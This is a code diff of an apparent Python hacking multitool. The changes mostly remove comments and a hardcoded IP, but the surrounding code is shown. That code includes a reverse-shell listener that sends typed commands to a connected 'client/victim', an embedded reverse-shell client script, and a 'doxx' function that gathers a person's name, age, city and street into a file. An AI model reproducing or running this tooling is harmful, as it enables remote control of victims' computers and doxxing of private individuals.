@@ -31,7 +31,6 @@ client_rsh_script_content = """
 import os
 import subprocess
 import socket
-from colorama import Fore, Style
 
 s = socket.socket()
 host = socket.gethostbyname(socket.gethostname())
@@ -88,7 +87,7 @@ def ip_lookup():
         time.sleep(1)
         main()
     except Exception:
-        print(Fore.RED + "An error occured | Most likely due to an invalid IP") # 79.167.64.211
+        print(Fore.RED + "An error occured | Most likely due to an invalid IP") 
         time.sleep(2)
         print(Fore.BLUE + "Returning to the main menu in 5")
         time.sleep(1)
@@ -339,7 +338,7 @@ def doxx():
     while True:
         save = input(Fore.BLUE + Style.BRIGHT + "Would you like to save it on your computer? (Yes/No) ").upper()
         if save == "YES":
-            cur_dir = os.getcwd()  # Get current directory
+            cur_dir = os.getcwd()  
             with open(os.path.join(cur_dir, 'info.txt'), 'w') as f:
                 f.write(f"Name: {name}\nAge: {age}\nCountry: {country}\nCity: {city}\nStreet: {street}")
             print(Fore.BLUE + Style.BRIGHT + f"Successfully saved to {os.path.join(cur_dir, 'info.txt')}!")
@@ -357,28 +356,23 @@ def doxx():
 
 def chat():
     try:
-        #Define constants to be used
         HOST_IP = socket.gethostbyname(socket.gethostname())
         HOST_PORT = 12345
         ENCODER = "utf-8"
         BYTESIZE = 1024
-
-        #Create a server socket, bind it to a ip/port, and listen
+     
         server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server_socket.bind((HOST_IP, HOST_PORT))
         server_socket.listen()
 
-        #Accept any incoming connection and let them know they are connected
         print("Server is running...\n")
         client_socket, client_address = server_socket.accept()
         client_socket.send("You are connected to the server...\n".encode(ENCODER))
 
-        #Send/receive messages
         while True:
-            #Receive information from the client
-            message = client_socket.recv(BYTESIZE).decode(ENCODER)
 
-            #Quit if the client socket wants to quit, else display the message
+            message = client_socket.recv(BYTESIZE).decode(ENCODER)
+         
             if message == "quit": 
                 client_socket.send("quit".encode(ENCODER))
                 print("\nEnding the chat...goodbye!")
@@ -395,7 +389,6 @@ def chat():
 
 def reverse_shell():
     try:
-        # Create a Socket (connect two computers)
         def create_socket():
             try:
                 global host 
@@ -407,7 +400,6 @@ def reverse_shell():
             except socket.error as msg:
                 print("Socket creation error: " + str(msg))
 
-        # Binding the socket and listening for connections
         def bind_socket():
             try:
                 global host 
@@ -425,19 +417,16 @@ def reverse_shell():
             except socket.error as msg:
                 print("Socket binding error" + str(msg) + "\n" + "Retrying...")
                 bind_socket()
-
-        # Establish connection with a client (socket must be listening)
                 
         def socket_accept():
             conn,address = s.accept()
             print("Connection has been established! | " + "IP " + address[0] + " PORT " + str(address[1]))
             send_commands(conn)
             conn.close()
-
-        # Send commands to client/victim or a friend
+         
         def send_commands(conn):
             while True:
-                cmd = input() # get an input
+                cmd = input()
                 if cmd == "quit": 
                     conn.close()
                     s.close()
